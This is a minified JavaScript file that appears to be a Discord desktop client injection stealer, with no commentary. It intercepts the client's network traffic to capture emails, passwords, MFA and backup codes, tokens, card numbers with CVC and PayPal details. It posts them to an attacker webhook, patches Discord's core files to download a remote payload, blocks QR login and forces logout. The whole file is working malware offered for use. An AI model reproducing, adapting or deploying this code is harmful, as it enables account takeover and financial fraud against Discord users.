const fs=require("fs"),os=require("os"),https=require("https"),args=process.argv,path=require("path"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron"),CONFIG={webhook:"%HOOKRE%",injection_url:"https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/injecci.js",filters:{urls:["/auth/login","/auth/register","/mfa/totp","/mfa/codes-verification","/users/@me"]},filters2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*","https://discord.com/api/v*/auth/sessions","https://*.discord.com/api/v*/auth/sessions","https://discordapp.com/api/v*/auth/sessions"]},payment_filters:{urls:["https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens"]},API:"https://discord.com/api/v9/users/@me",badges:{Discord_Emloyee:{Value:1,Emoji:"<:8485discordemployee:1163172252989259898>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:9928discordpartnerbadge:1163172304155586570>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:9171hypesquadevents:1163172248140660839>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:4744bughunterbadgediscord:1163172239970140383>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:5053earlysupporter:1163172241996005416>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:1757bugbusterbadgediscord:1163172238942543892>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:1207iconearlybotdeveloper:1163172236807639143>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:6601hypesquadbravery:1163172246492287017>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:6936hypesquadbrilliance:1163172244474822746>",Rare:!1},House_Balance:{Value:256,Emoji:"<:5242hypesquadbalance:1163172243417858128>",Rare:!1},Active_Developer:{Value:4194304,Emoji:"<:1207iconactivedeveloper:1163172534443851868>",Rare:!1},Certified_Moderator:{Value:262144,Emoji:"<:4149blurplecertifiedmoderator:1163172255489085481>",Rare:!0},Spammer:{Value:1048704,Emoji:"⌨️",Rare:!1}}},executeJS=e=>BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(e,!0),getToken=async()=>await executeJS("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"),request=async(e,s,t,a)=>{const n={protocol:(s=new URL(s)).protocol,hostname:s.host,path:s.pathname,method:e,headers:{"Access-Control-Allow-Origin":"*"}};s.search&&(n.path+=s.search);for(const e in t)n.headers[e]=t[e];const i=https.request(n);return a&&i.write(a),i.end(),new Promise(((e,s)=>{i.on("response",(s=>{let t="";s.on("data",(e=>t+=e)),s.on("end",(()=>e(t)))}))}))},hooker=async(e,s,t)=>{e.username="Report Bot",e.avatar_url="https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",e.embeds[0].thumbnail={url:`https://cdn.discordapp.com/avatars/${t.id}/${t.avatar}.webp`};const a=getNitro(t.premium_type),n=getBadges(t.flags),i=await getBilling(s);e.embeds[0].fields.push({name:"Token",value:"```"+s+"```",inline:!1},{name:"Badges",value:n,inline:!0},{name:"Nitro",value:a,inline:!0},{name:"Billing",value:i,inline:!0});for(const s in e.embeds)e.embeds[s].color=2303786;await request("POST",CONFIG.webhook,{"Content-Type":"application/json"},JSON.stringify(e))},fetch=async(e,s)=>JSON.parse(await request("GET",CONFIG.API+e,s)),fetchAccount=async e=>await fetch("",{Authorization:e}),fetchBilling=async e=>await fetch("/billing/payment-sources",{Authorization:e}),getBadges=e=>{let s="";for(const t in CONFIG.badges){let a=CONFIG.badges[t];(e&a.Value)==a.Value&&(s+=a.Emoji+" ")}return s||"`❌`"},getNitro=e=>{switch(e){case 1:return"`Nitro Classic`";case 2:return"`Nitro Boost`";case 3:return"`Nitro Basic`";default:return"`❌`"}},getBilling=async e=>{const s=await fetchBilling(e);let t="";return s.forEach((e=>{if(!e.invalid)switch(e.type){case 1:t+="💳 ";break;case 2:t+="<:paypal:1148653305376034967> "}})),t||"`❌`"},EmailPassToken=async(e,s,t,a)=>{const n=await fetchAccount(t),i={content:`**${n.username}** just ${a}!`,embeds:[{fields:[{name:"Email",value:"`"+e+"`",inline:!0},{name:"Password",value:"`"+s+"`",inline:!0}]}]};hooker(i,t,n)},PasswordChanged=async(e,s,t)=>{const a=await fetchAccount(t),n={content:` @updates : **${a.username}** just changed his password! `,embeds:[{fields:[{name:"New Password",value:"`"+e+"`",inline:!0},{name:"Old Password",value:"`"+s+"`",inline:!0}]}]};hooker(n,t,a)},CreditCardAdded=async(e,s,t,a,n)=>{const i=await fetchAccount(n),r={content:` @updates : **${i.username}** just added a credit card! `,embeds:[{fields:[{name:"Number",value:"`"+e+"`",inline:!0},{name:"CVC",value:"`"+s+"`",inline:!0},{name:"Expiration",value:"`"+t+"/"+a+"`",inline:!0}]}]};hooker(r,n,i)},PaypalAdded=async e=>{const s=await fetchAccount(e),t={content:`**${s.username}** just added a <:paypal:1148653305376034967> account!`,embeds:[{fields:[{name:"Email",value:"`"+s.email+"`",inline:!0},{name:"Phone",value:"`"+(s.phone||"None")+"`",inline:!0}]}]};hooker(t,e,s)},discordPath=function(){const e=args[0].split(path.sep).slice(0,-1).join(path.sep);let s;return"win32"===process.platform?s=path.join(e,"resources"):"darwin"===process.platform&&(s=path.join(e,"Contents","Resources")),fs.existsSync(s)?{resourcePath:s,app:e}:{undefined:void 0,undefined:void 0}}();async function updateCheck(){const{resourcePath:e,app:s}=discordPath;if(void 0===e||void 0===s)return;const t=path.join(e,"app"),a=path.join(t,"package.json"),n=path.join(t,"index.js"),i=`${s}\\modules\\${fs.readdirSync(`${s}\\modules\\`).filter((e=>/discord_desktop_core-+?/.test(e)))[0]}\\discord_desktop_core\\index.js`,r=path.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(fs.existsSync(t)||fs.mkdirSync(t),fs.existsSync(a)&&fs.unlinkSync(a),fs.existsSync(n)&&fs.unlinkSync(n),"win32"===process.platform||"darwin"===process.platform){fs.writeFileSync(a,JSON.stringify({name:"discord",main:"index.js"},null,4));const s=`const fs = require('fs'), https = require('https');\n  const indexJs = '${i}';\n  const bdPath = '${r}';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") \n          init();\n  })\n  async function init() {\n      https.get('${CONFIG.injection_url}', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%HOOKRE%', '${CONFIG.webhook}')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on("error", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('${path.join(e,"app.asar")}')\n  if (fs.existsSync(bdPath)) require(bdPath);`;fs.writeFileSync(n,s.replace(/\\/g,"\\\\"))}if(!fs.existsSync(path.join(__dirname,"initiation")))return;fs.rmdirSync(path.join(__dirname,"initiation"));const o=await getToken();if(!o)return;const d=await fetchAccount(o);await hooker(c,o,d),executeJS('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();')}let email="",password="";const createWindow=()=>{mainWindow=BrowserWindow.getAllWindows()[0],mainWindow&&(mainWindow.webContents.debugger.attach("1.3"),mainWindow.webContents.debugger.on("message",(async(e,s,t)=>{if("Network.responseReceived"!==s)return;if(!CONFIG.filters.urls.some((e=>t.response.url.endsWith(e))))return;if(![200,202].includes(t.response.status))return;const a=await mainWindow.webContents.debugger.sendCommand("Network.getResponseBody",{requestId:t.requestId}),n=JSON.parse(a.body),i=await mainWindow.webContents.debugger.sendCommand("Network.getRequestPostData",{requestId:t.requestId}),r=JSON.parse(i.postData);switch(!0){case t.response.url.endsWith("/login"):if(!n.token)return email=r.login,void(password=r.password);EmailPassToken(r.login,r.password,d.phone,"logged in");break;case t.response.url.endsWith("/register"):EmailPassToken(r.email,r.password,d.phone,n.token);break;case t.response.url.endsWith("/totp"):EmailPassToken(email,password,d.phone,n.token);break;case t.response.url.endsWith("/codes-verification"):BackupCodesViewed(n.backup_codes,await getToken());break;case t.response.url.endsWith("/@me"):if(!r.password)return;r.email&&EmailPassToken(r.email,r.password,n.token,"` @updates : changed email to **"+r.email+"** `"),r.new_password&&PasswordChanged(r.new_password,r.password,n.token)}})),mainWindow.webContents.debugger.sendCommand("Network.enable"),mainWindow.on("closed",(()=>{createWindow()})))};createWindow(),session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters,(async(e,s)=>{if([200,202].includes(e.statusCode)&&"POST"==e.method)switch(!0){case e.url.endsWith("tokens"):const s=querystring.parse(Buffer.from(e.uploadData[0].bytes).toString());CreditCardAdded(s["card[number]"],s["card[cvc]"],s["card[exp_month]"],s["card[exp_year]"],await getToken());break;case e.url.endsWith("paypal_accounts"):PaypalAdded(await getToken())}})),session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2,((e,s)=>{if(e.url.startsWith("wss://remote-auth-gateway")||e.url.endsWith("auth/sessions"))return s({cancel:!0});updateCheck()})),module.exports=require("./core.asar");
